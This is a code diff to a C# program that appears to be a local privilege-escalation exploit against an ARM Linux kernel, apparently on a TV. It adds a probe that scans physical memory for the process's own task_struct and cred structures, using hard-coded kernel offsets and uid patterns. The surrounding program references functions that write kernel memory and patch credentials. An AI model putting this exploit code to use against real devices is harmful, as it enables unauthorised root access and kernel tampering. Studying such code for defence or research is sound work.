@@ -40,6 +40,8 @@ internal static class Program
     const uint O_COMM = 0x400;
     const uint O_CRED = 0x3F8;
     const uint O_REAL = 0x3F4;
+    const uint O_CHILDREN = 0x2F8;   // list_head children (pontusml DWARF, next to the TV-measured 0x2F0/0x2F4)
+    const uint O_SIBLING = 0x300;    // fork() links &child->sibling into &parent->children
     static readonly byte[] SEQ = Encoding.ASCII.GetBytes("name_to_dev_t\0init_task\0kernel_neon_end");
     static readonly byte[] IMG_SIG = { 0xEE, 0x44, 0x00, 0xEB, 0x00, 0x90, 0x0F, 0xE1 };
 
@@ -687,6 +689,212 @@ internal static class Program
         return false;
     }
 
+    // ---- v38.1: high-allocation probe (read-only diagnostic) -------------------
+    // Why a parent/cred at/above 0xE0000000 never reads coherently has exactly
+    // two candidate causes (cache visibility is closed: v28 measured uid ==
+    // plain garbage through two VA geometries):
+    //   (a) wrong translation - a high VA is not a linear-map address, so
+    //       `va - 0xA0000000` reads the wrong frame (junk = other RAM,
+    //       0xFF = unbacked).  NOTE: the linear map's end on THIS unit is
+    //       unmeasured - the 0xE0000000/0xE0800000 split traces to a stale
+    //       recon-tree comment that a later revision retracted, and nobody has
+    //       read high_memory here - so (a) is the lead, not a proven fact;
+    //   (b) video40 returns wrong bytes even for the frame it is pointed at.
+    // This probe is the measurement that tells them apart.  READS ONLY: no
+    // Write32, no PatchCred.  It runs once, in the fast-mode gate branch right
+    // before the existing fast-exit, under a 2.5 s stopwatch so the attempt-1
+    // exit stays fast.  The gate, Kptr and every timing are untouched (trap 16).
+    //
+    // v38.1 (code review): tasks are NOT page-aligned (0xe2df7300 sits at page
+    // offset 0x300), so the first cut that probed page+0x400/page+0x3F8 could
+    // never hit a real task and would always have reported "miss".  The probe
+    // now works on task ADDRESSES:
+    //   linear      - CommAt(parent) reads "PHYSRPT1\0" at the translated
+    //                 parent address itself: the read path got the right frame
+    //                 and still returned junk cred words;
+    //   elsewhere   - sweep proven RAM (0x20000000..0x40000000, the band
+    //                 LocateInit/CredScanNear/the tail walks already cover) for
+    //                 the 8 name bytes at ANY offset (slab objects are not
+    //                 page-aligned), verify the NUL follow-byte at hit+8 across
+    //                 the page edge, take the task as hit-0x400, and accept it
+    //                 only when its children list (task+0x2F8, next OR prev)
+    //                 contains &child->sibling = child+0x300 - fork() links
+    //                 the sibling member, not tasks (0x23C), and the pontusml
+    //                 DWARF confirms children=0x2F8/sibling=0x300 beside the
+    //                 TV-measured 0x2F0/0x2F4/0x3F8/0x400.  at= is the TASK
+    //                 address; cuid=5001 there would make a locate-and-patch
+    //                 read path possible without touching the gate;
+    //   cred-elsewhere - parent low, cred high: locate the ids pattern (every
+    //                 hit per page; an offset-0..3 hit is skipped, not
+    //                 page-closing, as in CredScanNear) and turn the physical
+    //                 cred into a VA before CredUid.
+    // The translated page (0x40000000..0x5FFFFFFF) is only ever POINT-read -
+    // the access class the direct-probe phead=/pplain= lines have used since
+    // v28.  Full-page reads are slower than the first cut's 16-byte probe, so
+    // the 2.5 s budget may stop the sweep inside the +/-16 MiB requested range;
+    // cov= is the range ACTUALLY read and a miss is inconclusive, not evidence
+    // of absence.
+    // Twin: high_alloc_probe in tools/sim_rpc.py.
+
+    static void HighAllocProbe(uint child, uint parent, uint cred)
+    {
+        const int BudgetMs = 2500;     // attempt 1 must still exit fast
+        const int SpanPages = 4096;    // +/- 16 MiB requested around the anchor page
+        var sw = System.Diagnostics.Stopwatch.StartNew();
+        byte[] selfTag = Encoding.ASCII.GetBytes("PHYSRPT1");   // Main()'s PR_SET_NAME
+        // Search the 8 name bytes per page and verify the NUL follow-byte at
+        // hit+8 (one cross-page byte read, only on candidate hits).  A carry
+        // across pages would be order-dependent: the outward +/-step walk does
+        // NOT visit physically adjacent pages consecutively.
+        var commPat = selfTag;
+        bool parentHigh = Kptr(parent) && parent >= 0xE0000000;
+
+        // 1. the translated parent address, point-read: is the parent task there?
+        bool pComm = false;
+        uint pPage = 0, pCred = 0;
+        uint pUid = 0xFFFFFFFF;
+        if (parentHigh && V2P(parent) >= 0x20000000 && V2P(parent) < 0x60000000)
+        {
+            pPage = V2P(parent) & 0xFFFFF000;
+            pComm = CommAt(parent, selfTag);
+            try { pCred = U32(ReadPhys(V2P(parent) + O_CRED, 4), 0); } catch { }
+            if (Kptr(pCred)) pUid = CredUid(pCred);
+        }
+
+        string verdict;
+        uint atPage = 0, atCred = 0, uid = 0xFFFFFFFF;
+        int hits = 0;
+        uint covLo = 0, covHi = 0;
+        bool found = pComm;
+        if (found)
+        {
+            verdict = "linear";
+            atPage = V2P(parent);   // the TASK address, not the page base
+            atCred = pCred;
+            uid = pUid;
+        }
+        else if (parentHigh)
+        {
+            // 2. walk outward from the child's page; find "PHYSRPT1" at any
+            // offset (tasks are slab objects, not page-aligned; the NUL
+            // follow-byte at +8 is verified across the page edge), take the
+            // task as hit-0x400, and require the children list to link the
+            // child's sibling member - a freed or unrelated look-alike fails
+            // this check.
+            uint cPage = V2P(child) & 0xFFFFF000;
+            uint want = child + O_SIBLING;
+            for (int step = 0; step <= SpanPages && !found && sw.ElapsedMilliseconds < BudgetMs; step++)
+            {
+                int[] dirs = step == 0 ? new[] { 0 } : new[] { -1, 1 };
+                foreach (int dir in dirs)
+                {
+                    long p = (long)cPage + (long)dir * step * 0x1000;
+                    if (p < 0x20000000 || p >= 0x40000000) continue;
+                    uint page = (uint)p;
+                    if (covLo == 0 || page < covLo) covLo = page;
+                    if (page > covHi) covHi = page;
+                    byte[] data;
+                    try { data = ReadPhys(page, 0x1000); } catch { continue; }
+                    int idx = IndexOf(data, commPat);
+                    while (idx >= 0 && !found)
+                    {
+                        long hitPa = (long)page + idx;
+                        long taskPa = hitPa - O_COMM;
+                        if (taskPa >= 0x20000000)
+                        {
+                            try
+                            {
+                                // comm is NUL-terminated at hit+8, which can
+                                // live in the next page; ReadPhys reaches it
+                                if (ReadPhys((uint)hitPa + 8, 1)[0] == 0)
+                                {
+                                    hits++;
+                                    byte[] nb = ReadPhys((uint)taskPa + O_CHILDREN, 8);
+                                    if (U32(nb, 0) == want || U32(nb, 4) == want)
+                                    {
+                                        found = true;
+                                        atPage = (uint)taskPa;
+                                        try { atCred = U32(ReadPhys((uint)taskPa + O_CRED, 4), 0); } catch { }
+                                        if (Kptr(atCred)) uid = CredUid(atCred);
+                                    }
+                                }
+                            }
+                            catch { }
+                        }
+                        idx = IndexOf(data, commPat, idx + 1);
+                    }
+                }
+            }
+            verdict = found ? "elsewhere" : (hits > 0 ? "comm-only" : "miss");
+        }
+        else
+        {
+            // Parent low but its cred pointer is the high object: locate cred
+            // CONTENT (the ids pattern, as CredScanNear sees it) and compare
+            // the frame.  Locate only - never patched.
+            verdict = "cred-miss";
+            uint anchor = V2P(child) & 0xFFFFF000;
+            try
+            {
+                uint cc = U32(ReadPhys(V2P(child) + O_CRED, 4), 0);
+                // the child's cred can itself be the high object (v30/v31 boots:
+                // ccred=e2c35300) - its translated page is then outside the
+                // sweep and the child's TASK page (low, the walk read its comm)
+                // is the anchor
+                if (Kptr(cc) && V2P(cc) >= 0x20000000 && V2P(cc) < 0x40000000)
+                    anchor = V2P(cc) & 0xFFFFF000;
+            }
+            catch { }
+            var pat16 = new byte[16];
+            for (int i = 0; i < 2; i++)
+            {
+                BitConverter.GetBytes(5001u).CopyTo(pat16, i * 8);
+                BitConverter.GetBytes(100u).CopyTo(pat16, i * 8 + 4);
+            }
+            for (int step = 0; step <= SpanPages && !found && sw.ElapsedMilliseconds < BudgetMs; step++)
+            {
+                int[] dirs = step == 0 ? new[] { 0 } : new[] { -1, 1 };
+                foreach (int dir in dirs)
+                {
+                    long p = (long)anchor + (long)dir * step * 0x1000;
+                    if (p < 0x20000000 || p >= 0x40000000) continue;
+                    uint page = (uint)p;
+                    if (covLo == 0 || page < covLo) covLo = page;
+                    if (page > covHi) covHi = page;
+                    byte[] data;
+                    try { data = ReadPhys(page, 0x1000); } catch { continue; }
+                    int idx = IndexOf(data, pat16);
+                    while (idx >= 0 && !found)
+                    {
+                        if (idx >= 4)
+                        {
+                            found = true;
+                            atPage = page;
+                            atCred = page + (uint)idx - 4;
+                            // CredUid wants a kernel VA; atCred is physical
+                            uid = CredUid((atCred + PHYS_OFF) & 0xFFFFFFFF);
+                            verdict = "cred-elsewhere";   // the translated frame (>= 0x40000000) can never equal this
+                        }
+                        idx = IndexOf(data, pat16, idx + 1);
+                    }
+                }
+            }
+        }
+        DropPages();
+        Beacon("high-scan C=" + child.ToString("x8") +
+               " P=" + parent.ToString("x8") +
+               " pp=" + (parentHigh ? pPage.ToString("x8") : "-") +
+               " cp=" + (Kptr(cred) ? (V2P(cred) & 0xFFFFF000).ToString("x8") : "-") +
+               " pc=" + (pComm ? 1 : 0) +
+               " hits=" + hits +
+               " at=" + (found ? atPage.ToString("x8") : "-") +
+               " cred=" + (found ? atCred.ToString("x8") : "-") +
+               " cuid=" + UidWord(uid) +
+               " cov=" + (covLo != 0 ? covLo.ToString("x8") + "-" + covHi.ToString("x8") : "-") +
+               " ms=" + sw.ElapsedMilliseconds +
+               " verdict=" + verdict);
+    }
+
     // Parent-cred uid of a PHYRFORK, for the hunt latch.    // 5001 = ours.  Anything else used to be skip-orphan. v22 still dropped
     // attempt 1 when the stale parent cred read as some uid other than 0 /
     // 0xFFFFFFFF (cold boot 2026-10-25: seen=1 skip-orphan=1, child=0).
@@ -1323,6 +1531,10 @@ internal static class Program
                     if (highAlloc && !sawLow && fastMode && getuid() != 0)
                     {
                         uint logCred = highJunk ? junkCred : highCred;
+                        // v38: one read-only high-scan beacon before the exit -
+                        // it answers whether the translated parent page is the
+                        // parent task or a wrong frame (see HighAllocProbe).
+                        HighAllocProbe(child, highParent, logCred);
                         uint logReal = highJunk ? junkReal : highReal;
                         Beacon("high-alloc parent=" + highParent.ToString("x8") +
                                " cred=" + logCred.ToString("x8") +
